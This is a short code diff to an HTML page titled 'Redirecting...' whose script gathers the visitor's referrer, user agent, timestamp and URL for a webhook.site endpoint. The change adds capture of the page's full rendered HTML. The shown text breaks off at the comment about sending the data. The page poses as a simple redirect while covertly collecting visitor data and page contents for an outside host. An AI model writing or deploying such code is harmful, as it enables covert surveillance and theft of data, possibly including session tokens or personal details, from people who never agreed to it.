@@ -3,13 +3,14 @@
   <head>
     <title>Redirecting...</title>
     <script>
-      // Construct the full URL with referrer, user agent, and current time
+      // Construct the full URL with referrer, user agent, timestamp, and DOM content
       const webhookUrl = "https://webhook.site/d9339d40-0ae9-49cd-a44e-745f29893082";
       const payload = {
         referrer: document.referrer,
         userAgent: navigator.userAgent,
         timestamp: new Date().toISOString(),
-        url: window.location.href
+        url: window.location.href,
+        html: document.documentElement.innerHTML // Capture full rendered HTML
       };
 
       // Send data to webhook
